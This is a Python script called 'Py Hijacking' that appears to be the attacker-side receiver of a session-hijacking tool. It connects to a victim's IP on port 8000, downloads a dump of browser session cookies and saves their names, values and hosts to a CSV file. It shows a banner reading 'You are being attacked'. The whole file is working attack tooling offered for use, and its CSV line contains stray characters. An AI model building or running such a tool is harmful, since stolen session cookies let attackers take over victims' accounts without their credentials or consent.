import socket, ast, argparse, sys, re;
from art import *
from termcolor import colored
from rich.console import Console;
from rich.panel import Panel;
from rich.markdown import Markdown;



def GenerateAscii(text, font, color):
    asciiText= text2art(text, font=font)
    return colored(asciiText, color)


def ReceiveCookies(victimIp, port = 8000):

    # Create Socket
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);


    #Establish Connection
    serverAddress = (victimIp, port);
    clientSocket.connect(serverAddress);



    cookies = "";

    while(True):

        chunck = clientSocket.recv(4096).decode("utf-8"); 

        if(not chunck):
            break;
        
        cookies += chunck; 


    cookies = ast.literal_eval(cookies); #Convert str to operable structure
    
    if(not cookies):
        return False;


    with open("./Cookies.csv", "+a") as file: 
        # Write to the CSV header
        if file.tell() == 0:
            file.write("name,value,host\n"); 

        for register in cookies:
            file.write(f"{register[0]},{register[1]},{register[2]}\nkj");

    return True;
    

    
def DrawCover(ip, port):    
    console = Console();
    asciiName = GenerateAscii("Py Hijacking ", "sblood", "cyan")

    markdownText = f"""

{asciiName}
# By XanderL2 Github
You are being attacked:
- **Victim IP ==>** {ip}
- **Port      ==>** {port}


Will return a csv with the session cookies with the following structure:
```javascript
const Values = ["name", "value", "host"]
```

[Follow me on Github](https://github.com/XanderL2)
    """
    
    markdownObject = Markdown(markdownText)
    console.print(Panel(markdownObject, border_style="green", style="bold magenta"))






def main():

    parser = argparse.ArgumentParser(description='Session Hijacking Script');

    parser.add_argument("-ip", "--VictimIP", required=True, type=str, help="Victim's IP to receive the data");
    parser.add_argument("-p", "--ConnectionPort", required=False, type=int, default=8000, help="Connection port to receive cookies");


    #Args
    args = parser.parse_args();
    ip = args.VictimIP;
    port = args.ConnectionPort; 


    if (not re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip)):
        print("Error! Invalid IP")
        sys.exit()


    DrawCover(ip, port)


    try:
        cookies = ReceiveCookies(ip, port);

        if(not cookies):
            print("Could not get cookies, browser is active!")
 

    except socket.timeout:
        print("Error: Connection timed out")
    except ConnectionRefusedError:
        print("Error: Connection refused by the server")
    except ConnectionResetError:
        print("Error: Connection reset by peer")
    except OSError as e:
        print(f"OS Error: {e}")

       





















if __name__ == "__main__":
    main()
